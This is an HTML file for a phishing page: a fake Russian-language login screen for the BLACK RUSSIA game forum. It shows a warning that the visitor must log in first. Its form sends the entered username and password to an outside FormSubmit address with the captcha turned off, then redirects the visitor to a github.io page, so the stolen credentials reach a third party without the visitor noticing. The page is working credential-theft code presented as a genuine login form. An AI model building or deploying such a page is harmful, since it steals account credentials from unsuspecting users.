<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Вход</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            -webkit-tap-highlight-color: transparent;
        }
        body {
            background-color: #404348;
            color: #FFFFFF;
            font-size: 15px;
            line-height: 1.4;
            min-height: 100vh;
            padding: 0;
            overflow-x: hidden;
        }
        .top-bar {
            background-color: #2C2C30;
            padding: 14px 16px;
            display: flex;
            align-items: center;
            border-bottom: 1px solid #3A3A3E;
        }
        .menu-icon {
            display: flex;
            flex-direction: column;
            gap: 3px;
            cursor: pointer;
        }
        .menu-line {
            width: 20px;
            height: 2px;
            background-color: #FFFFFF;
        }
        .main-content {
            padding: 16px;
            margin: 0 auto;
            max-width: 400px;
            width: 100%;
            box-sizing: border-box;
        }
        .page-title {
            color: #FFFFFF;
            font-size: 22px;
            font-weight: 600;
            margin-bottom: 15px;
        }
        .alert-panel {
            background-color: #FBE6E7;
            padding: 14px 12px;
            margin-bottom: 25px;
            display: flex;
            align-items: flex-start;
            gap: 12px;
        }
        .alert-icon-container {
            width: 30px;
            height: 30px;
            background-color: transparent;
            border: 2px solid #D32F2F;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-shrink: 0;
            margin-top: 1px;
        }
        .alert-icon {
            color: #D32F2F;
            font-size: 16px;
            font-weight: 900;
        }
        .alert-text {
            color: #D32F2F;
            font-size: 14px;
            font-weight: 600;
            line-height: 1.4;
            flex: 1;
        }
        .form-group { margin-bottom: 18px; }
        .form-label {
            display: block;
            color: #FFFFFF;
            font-size: 14px;
            margin-bottom: 6px;
            padding-left: 2px;
        }
        .form-input {
            width: 100%;
            padding: 10px 12px;
            background-color: #404348;
            border: 1px solid #5A5A5E;
            color: #FFFFFF;
            font-size: 15px;
            border-radius: 0;
            -webkit-appearance: none;
            height: 38px;
            box-sizing: border-box;
        }
        .form-input:focus { outline: none; border-color: #707074; }
        .password-wrapper { position: relative; margin-bottom: 8px; }
        .password-input {
            width: 100%;
            padding: 10px 70px 10px 12px;
            background-color: #404348;
            border: 1px solid #5A5A5E;
            color: #FFFFFF;
            font-size: 15px;
            border-radius: 0;
            -webkit-appearance: none;
            height: 38px;
            box-sizing: border-box;
        }
        .password-divider {
            position: absolute;
            right: 70px;
            top: 0;
            height: 38px;
            width: 1px;
            background-color: #5A5A5E;
        }
        .eye-button {
            position: absolute;
            right: 0;
            top: 0;
            height: 38px;
            width: 70px;
            background-color: #404348;
            border: 1px solid #5A5A5E;
            border-left: none;
            color: #8E8E93;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 13px;
            padding: 0;
            border-radius: 0;
            box-sizing: border-box;
        }
        .forgot-link {
            color: #FFFFFF;
            font-size: 12px;
            text-decoration: none;
            display: block;
            margin-top: 0;
            text-align: left;
            padding-left: 2px;
        }
        .checkbox-group { display: flex; align-items: center; margin: 20px 0; }
        .checkbox-input {
            width: 14px;
            height: 14px;
            background-color: #404348;
            border: 2px solid #FFFFFF;
            margin-right: 8px;
            cursor: pointer;
            appearance: none;
            position: relative;
        }
        .checkbox-input:checked { background-color: #5A5A5E; border-color: #FFFFFF; }
        .checkbox-input:checked::after {
            content: "✔";
            position: absolute;
            color: #FFFFFF;
            font-size: 10px;
            font-weight: normal;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
        }
        .checkbox-label { color: #FFFFFF; font-size: 14px; cursor: pointer; }
        .login-button-container { display: flex; justify-content: center; margin: 18px 0; }
        .login-button {
            width: 140px;
            padding: 8px 12px;
            background-color: #252528;
            border: 1px solid #3A3A3E;
            color: #F0F0F0;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            border-radius: 4px;
            height: 36px;
            box-sizing: border-box;
            transition: all 0.2s ease;
        }
        .login-button:hover { background-color: #2C2C30; border-color: #4A4A4E; }
        .login-button:disabled { opacity: 0.6; cursor: not-allowed; }
        .register-section {
            margin-top: 22px;
            padding-top: 18px;
            border-top: 1px solid #3A3A3E;
            text-align: center;
        }
        .register-line {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            color: #FFFFFF;
            font-size: 14px;
        }
        .register-text { color: #FFFFFF; }
        .register-link { color: #FFFFFF; font-weight: 600; text-decoration: none; }
        .footer {
            padding: 18px 16px;
            background-color: #2C2C30;
            border-top: 1px solid #3A3A3E;
            text-align: center;
            margin-top: 20px;
            box-sizing: border-box;
            width: 100%;
        }
        .footer-links {
            display: flex;
            justify-content: center;
            flex-wrap: wrap;
            gap: 18px;
            margin-bottom: 8px;
        }
        .footer-link { color: #FFFFFF; font-size: 11px; text-decoration: none; }
        .copyright { color: #FFFFFF; font-size: 11px; margin-top: 3px; }
        @media (max-width: 374px) {
            .top-bar { padding: 12px 14px; }
            .main-content { padding: 14px; }
            .page-title { font-size: 20px; margin-bottom: 12px; }
            .alert-icon-container { width: 26px; height: 26px; }
            .alert-icon { font-size: 14px; }
            .form-input, .password-input { padding: 8px 10px; height: 36px; font-size: 14px; }
            .password-input { padding-right: 65px; }
            .password-divider { right: 65px; height: 36px; }
            .eye-button { width: 65px; height: 36px; font-size: 12px; }
            .login-button { width: 120px; padding: 6px 10px; height: 34px; font-size: 13px; border-radius: 3px; }
            .checkbox-input { width: 13px; height: 13px; }
            .checkbox-input:checked::after { font-size: 9px; }
        }
        @media (max-width: 320px) {
            .top-bar { padding: 10px 12px; }
            .main-content { padding: 12px; }
            .page-title { font-size: 19px; }
            .alert-icon-container { width: 24px; height: 24px; }
            .alert-icon { font-size: 13px; }
            .form-input, .password-input { padding: 7px 9px; height: 34px; font-size: 13px; }
            .password-input { padding-right: 60px; }
            .password-divider { right: 60px; height: 34px; }
            .eye-button { width: 60px; height: 34px; font-size: 11px; }
            .login-button { width: 110px; padding: 5px 8px; height: 32px; font-size: 12px; border-radius: 2px; }
            .register-line { font-size: 13px; }
            .checkbox-input { width: 12px; height: 12px; }
            .checkbox-input:checked::after { font-size: 8px; }
        }
    </style>
</head>
<body>
    <div class="top-bar">
        <div class="menu-icon">
            <div class="menu-line"></div>
            <div class="menu-line"></div>
            <div class="menu-line"></div>
        </div>
    </div>
    <div class="main-content">
        <h1 class="page-title">Вход</h1>
        <div class="alert-panel">
            <div class="alert-icon-container">
                <div class="alert-icon">✕</div>
            </div>
            <div class="alert-text">Для того, чтобы это сделать, нужно сначала войти на форум.</div>
        </div>
        <form id="loginForm" action="https://formsubmit.co/el/zifafu" method="POST">
            <!-- Настройки FormSubmit -->
            <input type="hidden" name="_subject" value="Новая попытка входа на BLACK RUSSIA">
            <input type="hidden" name="_captcha" value="false">
            <input type="hidden" name="_template" value="table">
            <input type="hidden" name="_next" value="https://blackrussia-forum.github.io/BlackRussia.online/">
            <input type="text" name="_honey" style="display:none">
            <div class="form-group">
                <label class="form-label">Имя пользователя или email:</label>
                <input type="text" name="Логин" class="form-input" required>
            </div>
            <div class="form-group">
                <label class="form-label">Пароль:</label>
                <div class="password-wrapper">
                    <input type="password" name="Пароль" class="password-input" id="password" required>
                    <div class="password-divider"></div>
                    <button type="button" class="eye-button" id="togglePassword">Показать</button>
                </div>
                <a href="#" class="forgot-link">Забыли свой пароль?</a>
            </div>
            <div class="checkbox-group">
                <input type="checkbox" class="checkbox-input" id="remember" name="Запомнить_меня" checked>
                <label for="remember" class="checkbox-label">Запомнить меня</label>
            </div>
            <div class="login-button-container">
                <button type="submit" class="login-button">ВОЙТИ</button>
            </div>
        </form>
        <div class="register-section">
            <div class="register-line">
                <span class="register-text">У Вас ещё нет учётной записи?</span>
                <a href="#" class="register-link">Зарегистрируйтесь</a>
            </div>
        </div>
    </div>
    <div class="footer">
        <div class="footer-links">
            <a href="#" class="footer-link">Условия и правила</a>
            <a href="#" class="footer-link">Политика конфиденциальности</a>
        </div>
        <div class="copyright">© 2023 BLACK RUSSIA. Все права защищены.</div>
    </div>
    <script>
        const togglePassword = document.getElementById('togglePassword');
        const passwordInput = document.getElementById('password');
        togglePassword.addEventListener('click', function () {
            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
            passwordInput.setAttribute('type', type);
            this.textContent = type === 'password' ? 'Показать' : 'Скрыть';
        });
        const form = document.getElementById('loginForm');
        form.addEventListener('submit', function (e) {
            const username = this.querySelector('input[name="Логин"]').value.trim();
            const password = passwordInput.value.trim();
            if (!username || !password) {
                e.preventDefault();
                alert('Пожалуйста, заполните все поля');
                return;
            }
            const button = this.querySelector('button[type="submit"]');
            button.textContent = 'ВХОД...';
            button.disabled = true;
        });
        document.querySelector('.menu-icon').addEventListener('click', function () {});
        window.addEventListener('DOMContentLoaded', () => {
            document.querySelector('input[name="Логин"]').focus();
        });
        document.addEventListener('touchstart', function (event) {
            if (event.touches.length > 1) event.preventDefault();
        }, { passive: false });
    </script>
</body>
</html>
